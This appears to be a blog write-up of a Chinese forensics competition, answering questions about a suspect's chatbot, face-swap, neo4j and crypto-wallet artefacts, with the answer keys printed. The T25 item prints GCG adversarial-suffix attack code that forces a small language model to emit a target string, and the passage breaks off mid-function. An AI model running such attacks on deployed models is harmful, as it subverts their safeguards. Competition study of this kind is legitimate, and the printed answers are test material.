class="line">20240503LOVE</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250422182642554.png" alt="image-20250422182642554"></p><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250422182815375.png" alt="image-20250422182815375"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2025/3/10 18:44:56</span><br></pre></td></tr></table></figure><h3 id="T8"><a href="#T8" class="headerlink" title="T8"></a>T8</h3><blockquote><p>分析起早王的计算机检材，SillyTavern中起早王用户下的聊天ai里有几个角色(格式：1)</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250428110141875.png" alt="image-20250428110141875"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">4</span><br></pre></td></tr></table></figure><h3 id="T9"><a href="#T9" class="headerlink" title="T9"></a>T9</h3><blockquote><p>分析起早王的计算机检材，SillyTavern中起早王与ai女友聊天所调用的语言模型(带文件后缀)(格式：xxxxx-xxxxxxx.xxxx)</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250422183446774.png" alt="image-20250422183446774"></p><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250428110154479.png" alt="image-20250428110154479"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Tifa-DeepsexV2-7b-Cot-0222-Q8.gguf</span><br></pre></td></tr></table></figure><h3 id="T10"><a href="#T10" class="headerlink" title="T10"></a>T10</h3><blockquote><p>分析起早王的计算机检材，电脑中ai换脸界面的监听端口(格式：80)</p></blockquote><p>我们在E盘发现了一个叫<code>facefusion_3.1.10</code>的文件夹，像是AI换脸工具。</p><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250422183855056.png" alt="image-20250422183855056"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">7860</span><br></pre></td></tr></table></figure><h3 id="T11"><a href="#T11" class="headerlink" title="T11"></a>T11</h3><blockquote><p>分析起早王的计算机检材，电脑中图片文件有几个被换过脸(格式：1)</p></blockquote><p>打开换脸网站后如下：</p><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250422184010680.png" alt="image-20250422184010680"></p><p>我们发现一个输出路径，那么肯定就是换脸后图片的输出路径了，我们跟进看看。</p><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250422184040697.png" alt="image-20250422184040697"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">3</span><br></pre></td></tr></table></figure><h3 id="T12"><a href="#T12" class="headerlink" title="T12"></a>T12</h3><blockquote><p>分析起早王的计算机检材，最早被换脸的图片所使用的换脸模型是什么(带文件后缀)(格式：xxxxxxxxxxx.xxxx)</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250422184129995.png" alt="image-20250422184129995"></p><p>最早被换脸的是这张。</p><p>我们看看日志</p><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250422184340007.png" alt="image-20250422184340007"></p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250428110238452.png" alt="image-20250428110238452" style="zoom:80%;" /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">inswapper_128_fp16.onnx</span><br></pre></td></tr></table></figure><h3 id="T13"><a href="#T13" class="headerlink" title="T13"></a>T13</h3><blockquote><p>分析起早王的计算机检材，neo4j中数据存放的数据库的名称是什么(格式：abd.ef)</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250422184708539.png" alt="image-20250422184708539"></p><p>我们直接点击bat文件打开数据库环境。</p><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250422184843701.png" alt="image-20250422184843701"></p><p>发现还需要账号密码，我们去之前的学习笔记中看一看，我记得是有neo4j的相关笔记的！</p><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250428110308541.png" alt="image-20250428110308541"></p><p>接下来我们下载一个xmind来打开这些文件。</p><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250428110316995.png" alt="image-20250428110316995"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">neo4j/secretqianqian</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250422185532352.png" alt="image-20250422185532352"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">graph.db</span><br></pre></td></tr></table></figure><h3 id="T14"><a href="#T14" class="headerlink" title="T14"></a>T14</h3><blockquote><p>分析起早王的计算机检材，neo4j数据库中总共存放了多少个节点(格式：1)</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250422185702027.png" alt="image-20250422185702027"></p><p>看node labels</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">17088</span><br></pre></td></tr></table></figure><h3 id="T15"><a href="#T15" class="headerlink" title="T15"></a>T15</h3><blockquote><p>分析起早王的计算机检材，neo4j数据库内白杰的手机号码是什么(格式：12345678901)</p></blockquote><p>这里自己AI一下查询语句或者现学即可。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MATCH (n:person &#123;name: &#x27;白杰&#x27;&#125;) return n</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250423101947231.png" alt="image-20250423101947231"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">13215346813</span><br></pre></td></tr></table></figure><h3 id="T16"><a href="#T16" class="headerlink" title="T16"></a>T16</h3><blockquote><p>分析起早王的计算机检材，分析neo4j数据库内数据，统计在2025年4月7日至13日期间使用非授权设备登录且登录地点超出其注册时登记的两个以上城市的用户数量(格式：1)</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">MATCH (u:User)-[:HAS_LOGIN]-&gt;(l:Login)-[:FROM_IP]-&gt;(ip:IP)</span><br><span class="line">MATCH (l)-[:USING_DEVICE]-&gt;(d:Device)</span><br><span class="line">WHERE </span><br><span class="line">  l.time &lt; datetime(&#x27;2025-04-14&#x27;)</span><br><span class="line">  AND ip.city &lt;&gt; u.reg_city</span><br><span class="line">  AND NOT (u)-[:TRUSTS]-&gt;(d)</span><br><span class="line">WITH </span><br><span class="line">  u,</span><br><span class="line">  collect(DISTINCT ip.city) AS 异常登录城市列表,</span><br><span class="line">  collect(DISTINCT d.device_id) AS 未授权设备列表,</span><br><span class="line">  count(l) AS 异常登录次数</span><br><span class="line">WHERE size(异常登录城市列表) &gt; 2</span><br><span class="line">RETURN </span><br><span class="line">  u.user_id AS 用户ID,</span><br><span class="line">  u.real_name AS 姓名,</span><br><span class="line">  异常登录城市列表,</span><br><span class="line">  未授权设备列表,</span><br><span class="line">  异常登录次数</span><br><span class="line">ORDER BY 异常登录次数 DESC;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250423105320811.png" alt="image-20250423105320811"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">44</span><br></pre></td></tr></table></figure><h3 id="T17"><a href="#T17" class="headerlink" title="T17"></a>T17</h3><blockquote><p>分析起早王的计算机检材，起早王的虚拟货币钱包的助记词的第8个是什么(格式：abandon)</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250423105849122.png" alt="image-20250423105849122"></p><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250423110038304.png" alt="image-20250423110038304"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">draft</span><br></pre></td></tr></table></figure><h3 id="T18"><a href="#T18" class="headerlink" title="T18"></a>T18</h3><blockquote><p>分析起早王的计算机检材，起早王的虚拟货币钱包是什么(格式：0x11111111)</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250423110248461.png" alt="image-20250423110248461"></p><p>我们利用助记词来重置一下密码。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0xd8786a1345cA969C792d9328f8594981066482e9</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250428110422796.png" alt="image-20250428110422796"></p><h3 id="T19"><a href="#T19" class="headerlink" title="T19"></a>T19</h3><blockquote><p>分析起早王的计算机检材，起早王请高手为倩倩发行了虚拟货币，请问倩倩币的最大供应量是多少(格式：100qianqian)</p></blockquote><p>这种一般要去区块链浏览器上看，我们在历史记录上可以看到</p><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250423112006697.png" alt="image-20250423112006697"></p><p>虚拟机上没有网，我们用自己的电脑看看</p><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250423123155775.png" alt="image-20250423123155775"></p><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250423123235422.png" alt="image-20250423123235422"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1000000qianqian</span><br></pre></td></tr></table></figure><h3 id="T20"><a href="#T20" class="headerlink" title="T20"></a>T20</h3><blockquote><p>分析起早王的计算机检材，起早王总共购买过多少倩倩币(格式：100qianqian)</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">521qianqian</span><br></pre></td></tr></table></figure><h3 id="T21"><a href="#T21" class="headerlink" title="T21"></a>T21</h3><blockquote><p>分析起早王的计算机检材，起早王购买倩倩币的交易时间是(单位：UTC)(格式：2020&#x2F;1&#x2F;1 01:01:01)</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250423123553483.png" alt="image-20250423123553483"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2025/3/24 02:08:36</span><br></pre></td></tr></table></figure><h2 id="AI题目"><a href="#AI题目" class="headerlink" title="AI题目"></a>AI题目</h2><h3 id="T22"><a href="#T22" class="headerlink" title="T22"></a>T22</h3><blockquote><p>分析crack文件，获得flag1(格式：flag1{123456})</p></blockquote><p>在虚拟机上解压crack.zip并安装一个python3.10.6</p><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250425104358209.png" alt="image-20250425104358209"></p><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250425111506218.png" alt="image-20250425111506218"></p><h3 id="T23"><a href="#T23" class="headerlink" title="T23"></a>T23</h3><blockquote><p>分析crack文件，获得flag2(格式：flag2{123456})</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250425110800345.png" alt="image-20250425110800345"></p><h3 id="T24"><a href="#T24" class="headerlink" title="T24"></a>T24</h3><blockquote><p>分析crack文件，获得flag3(格式：flag3{123456})</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250425111244069.png" alt="image-20250425111244069"></p><h3 id="T25"><a href="#T25" class="headerlink" title="T25"></a>T25</h3><blockquote><p>分析crack文件，获得flag4(格式：flag4{123456})</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">小语言妹妹很会讲故事，试试看她的表现吧！为了庆祝🐍年，如果你让她说出🐍的话也有奖励哦！hint:powered by tinystory</span><br></pre></td></tr></table></figure><p>tinystory 模型的 llm 爆破，参考 <a href="https://github.com/llm-attacks/llm-attacks/blob/main/llm_attacks/minimal_gcg/opt_utils.py%EF%BC%8C%E8%BF%99%E2%BE%A5%E4%BD%BF%E2%BD%A4%E5%AE%98%E2%BD%85">https://github.com/llm-attacks/llm-attacks/blob/main/llm_attacks/minimal_gcg/opt_utils.py，这⾥使⽤官⽅</a> wp ⾥⾯的 exp</p><p>相关论文：<a href="https://arxiv.org/abs/2307.15043">https://arxiv.org/abs/2307.15043</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> transformers <span class="keyword">import</span> AutoModelForCausalLM, AutoTokenizer, GenerationConfig</span><br><span class="line"><span class="keyword">from</span> livelossplot <span class="keyword">import</span> PlotLosses  <span class="comment"># pip install livelossplot</span></span><br><span class="line"><span class="keyword">import</span> gc</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">import</span> torch.nn <span class="keyword">as</span> nn</span><br><span class="line"><span class="keyword">from</span> transformers <span class="keyword">import</span> AutoModelForCausalLM, AutoTokenizer</span><br><span class="line"></span><br><span class="line">np.random.seed(<span class="number">20</span>)</span><br><span class="line">torch.manual_seed(<span class="number">20</span>)</span><br><span class="line">torch.cuda.manual_seed_all(<span class="number">20</span>)</span><br><span class="line"></span><br><span class="line">target = <span class="string">&quot;🐍&quot;</span>  <span class="comment"># attack string</span></span><br><span class="line">num_steps = <span class="number">500</span></span><br><span class="line">adv_string_init = <span class="string">&quot;!&quot;</span>*<span class="number">200</span></span><br><span class="line">adv_prefix = adv_string_init</span><br><span class="line"><span class="comment"># larger batch_size means more memory (but more likely to succeed)</span></span><br><span class="line">batch_size = <span class="number">512</span></span><br><span class="line">device = <span class="string">&#x27;cuda:0&#x27;</span></span><br><span class="line">topk = <span class="number">256</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_embedding_matrix</span>(<span class="params">model</span>):</span><br><span class="line">    <span class="keyword">return</span> model.transformer.wte.weight</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_embeddings</span>(<span class="params">model, input_ids</span>):</span><br><span class="line">    <span class="keyword">return</span> model.transformer.wte(input_ids)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">token_gradients</span>(<span class="params">model, input_ids, input_slice, target_slice, loss_slice</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Computes gradients of the loss with respect to the coordinates.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Parameters</span></span><br><span class="line"><span class="string">    ----------</span></span><br><span class="line"><span class="string">    model : Transformer Model</span></span><br><span class="line"><span class="string">        The transformer model to be used.</span></span><br><span class="line"><span class="string">    input_ids : torch.Tensor</span></span><br><span class="line"><span class="string">        The input sequence in the form of token ids.</span></span><br><span class="line"><span class="string">    input_slice : slice</span></span><br><span class="line"><span class="string">        The slice of the input sequence for which gradients need to be computed.</span></span><br><span class="line"><span class="string">    target_slice : slice</span></span><br><span class="line"><span class="string">        The slice of the input sequence to be used as targets.</span></span><br><span class="line"><span class="string">    loss_slice : slice</span></span><br><span class="line"><span class="string">        The slice of the logits to be used for computing the loss.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Returns</span></span><br><span class="line"><span class="string">    -------</span></span><br><span class="line"><span class="string">    torch.Tensor</span></span><br><span class="line"><span class="string">        The gradients of each token in the input_slice with respect to the loss.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    embed_weights = get_embedding_matrix(model)</span><br><span class="line">    one_hot = torch.zeros(</span><br><span class="line">        input_ids[input_slice].shape[<span class="number">0</span>],</span><br><span class="line">        embed_weights.shape[<span class="number">0</span>],</span><br><span class="line">        device=model.device,</span><br><span class="line">        dtype=embed_weights.dtype</span><br><span class="line">    )</span><br><span class="line">    one_hot.scatter_(</span><br><span class="line">        <span class="number">1</span>,</span><br><span class="line">        input_ids[input_slice].unsqueeze(<span class="number">1</span>),</span><br><span class="line">        torch.ones(one_hot.shape[<span class="number">0</span>], <span class="number">1</span>,</span><br><span class="line">                   device=model.device, dtype=embed_weights.dtype)</span><br><span class="line">    )</span><br><span class="line">    one_hot.requires_grad_()</span><br><span class="line">    input_embeds = (one_hot @ embed_weights).unsqueeze(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># now stitch it together with the rest of the embeddings</span></span><br><span class="line">    embeds = get_embeddings(model, input_ids.unsqueeze(<span class="number">0</span>)).detach()</span><br><span class="line">    full_embeds = torch.cat(</span><br><span class="line">        [</span><br><span class="line">            input_embeds,</span><br><span class="line">            embeds[:, input_slice.stop:, :]</span><br><span class="line">        ],</span><br><span class="line">        dim=<span class="number">1</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    logits = model(inputs_embeds=full_embeds).logits</span><br><span class="line">    targets = input_ids[target_slice]</span><br><span class="line">    loss = nn.CrossEntropyLoss()(logits[<span class="number">0</span>, loss_slice, :], targets)</span><br><span class="line"></span><br><span class="line">    loss.backward()</span><br><span class="line"></span><br><span class="line">    grad = one_hot.grad.clone()</span><br><span class="line">    grad = grad / grad.norm(dim=-<span class="number">1</span>, keepdim=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> grad</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sample_control</span>(<span class="params">control_toks, grad, batch_size</span>):</span><br><span class="line"></span><br><span class="line">    control_toks = control_toks.to(grad.device)</span><br><span class="line"></span><br><span class="line">    original_control_toks = control_toks.repeat(batch_size, <span class="number">1</span>)</span><br><span class="line">    new_token_pos = torch.arange(</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="built_in">len</span>(control_toks),</span><br><span class="line">        <span class="built_in">len</span>(control_toks) / batch_size,</span><br><span class="line">        device=grad.device</span><br><span class="line">    ).<span class="built_in">type</span>(torch.int64)</span><br><span class="line"></span><br><span class="line">    top_indices = (-grad).topk(topk, dim=<span class="number">1</span>).indices</span><br><span class="line">    new_token_val = torch.gather(</span><br><span class="line">        top_indices[new_token_pos], <span class="number">1</span>,</span><br><span class="line">        torch.randint(<span class="number">0</span>, topk, (batch_size, <span class="number">1</span>),</span><br><span class="line">                      device=grad.device)</span><br><span class="line">    )</span><br><span class="line">    new_control_toks = original_control_toks.scatter_(</span><br><span class="line">        <span class="number">1</span>, new_token_pos.unsqueeze(-<span class="number">1</span>), new_token_val)</span><br><span class="line">    <span class="keyword">return</span> new_control_toks</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_filtered_cands</span>(<span class="params">tokenizer, control_cand, filter_cand=<span class="literal">True</span>, curr_control=<span class="literal">None</span></span>):</span><br><span class="line">    cands, count = [], <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(control_cand.shape[<span class="number">0</span>]):</span><br><span class="line">        decoded_str = tokenizer.decode(</span><br><span class="line">            control_cand[i], skip_special_tokens=<span class="literal">True</span>)</span><br><span class="line">        <span class="keyword">if</span> filter_cand:</span><br><span class="line">            <span class="keyword">if</span> decoded_str != curr_control \</span><br><span class="line">                    <span class="keyword">and</span> <span class="built_in">len</span>(tokenizer(decoded_str, add_special_tokens=<span class="literal">False</span>).input_ids) == <span class="built_in">len</span>(control_cand[i]):</span><br><span class="line">                cands.append(decoded_str)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                count += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            cands.append(decoded_str)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> filter_cand:</span><br><span class="line">        cands = cands + [cands[-<span class="number">1</span>]] * (<span class="built_in">len</span>(control_cand) - <span class="built_in">len</span>(cands))</span><br><span class="line">    <span class="keyword">return</span> cands</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_logits</span>(<span class="params">*, model, tokenizer, input_ids, control_slice, test_controls, return_ids=<span class="literal">False</span>, batch_size=<span class="number">512</span></span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(test_controls[<span class="number">0</span>], <span class="built_in">str</span>):</span><br><span class="line">        max_len = control_slice.stop - control_slice.start</span><br><span class="line">        test_ids = [</span><br><span class="line">            torch.tensor(tokenizer(</span><br><span class="line">                control, add_special_tokens=<span class="literal">False</span>).input_ids[:max_len], device=model.device)</span><br><span class="line">            <span class="keyword">for</span> control <span class="keyword">in</span> test_controls</span><br><span class="line">        ]</span><br><span class="line">        pad_tok = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> pad_tok <span class="keyword">in</span> input_ids <span class="keyword">or</span> <span class="built_in">any</span>([pad_tok <span class="keyword">in</span> ids <span class="keyword">for</span> ids <span class="keyword">in</span> test_ids]):</span><br><span class="line">            pad_tok += <span class="number">1</span></span><br><span class="line">        nested_ids = torch.nested.nested_tensor(test_ids)</span><br><span class="line">        test_ids = torch.nested.to_padded_tensor(</span><br><span class="line">            nested_ids, pad_tok, (<span class="built_in">len</span>(test_ids), max_len))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(</span><br><span class="line">            <span class="string">f&quot;test_controls must be a list of strings, got <span class="subst">&#123;<span class="built_in">type</span>(test_controls)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> (test_ids[<span class="number">0</span>].shape[<span class="number">0</span>] == control_slice.stop - control_slice.start):</span><br><span class="line">        <span class="keyword">raise</span> ValueError((</span><br><span class="line">            <span class="string">f&quot;test_controls must have shape &quot;</span></span><br><span class="line">            <span class="string">f&quot;(n, <span class="subst">&#123;control_slice.stop - control_slice.start&#125;</span>), &quot;</span></span><br><span class="line">            <span class="string">f&quot;got <span class="subst">&#123;test_ids.shape&#125;</span>&quot;</span></span><br><span class="line">        ))</span><br><span class="line"></span><br><span class="line">    locs = torch.arange(control_slice.start, control_slice.stop).repeat(</span><br><span class="line">        test_ids.shape[<span class="number">0</span>], 